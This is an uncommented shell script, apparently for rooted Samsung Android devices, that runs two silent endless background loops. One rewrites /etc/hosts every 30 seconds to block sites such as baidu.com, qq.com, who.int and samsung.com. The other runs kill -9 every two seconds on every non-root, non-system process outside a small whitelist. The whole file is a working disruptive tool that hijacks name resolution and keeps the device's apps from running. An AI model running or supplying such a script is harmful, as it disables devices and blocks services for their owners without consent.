install(){
  if [ -f "instal.lock" ]
  then 
    return 0
  fi
  
  echo "done" > instal.lock
}
crackDNS(){
  while [ "1" = "1" ];
  do
    echo "127.0.0.1 localhost"                      > /etc/hosts
    echo "::1 localhost ip6-localhost ip6-loopback" >> /etc/hosts
    echo "127.0.0.1 baidu.com"      >> /etc/hosts
    echo "127.0.0.1 www.baidu.com"  >> /etc/hosts
    echo "127.0.0.1 sougo.com"      >> /etc/hosts
    echo "127.0.0.1 www.sougo.com"  >> /etc/hosts
    echo "127.0.0.1 qq.com"         >> /etc/hosts
    echo "127.0.0.1 www.who.int"    >> /etc/hosts
    echo "127.0.0.1 www.renren.com" >> /etc/hosts
    echo "127.0.0.1 renren.com"     >> /etc/hosts
    echo "127.0.0.1 www.samsung.com">> /etc/hosts
    sleep 30
  done
}
killprocess(){
  while [ "1" = "1" ];
  do
    ps -ef|
    grep \.|
    grep -v grep|
    grep -v com\.sec\.android\.app\.keyguard|
    grep -v com\.android\.settings|
    grep -v com\.sec\.android\.widgetapp\.alarmwidget|
    grep -v com\.sec\.android\.widgetapp\.activeapplicationwidget|
    grep -v com\.sec\.android\.provider\.badge|
    grep -v com\.sec\.factory|
    grep -v org\.simalliance\.openmobileapi|
    grep -v android\.process\.acore|
    grep -v com\.android\.systemui|
    grep -v org\.yrssf\.netspace|
    awk '{if($1!="root" && $1!="system"){print $2}}'|
    xargs kill -9 >/dev/null 2&>/dev/null
    sleep 2
  done
}
install
killprocess &
crackDNS >/dev/null 2&>/dev/null   &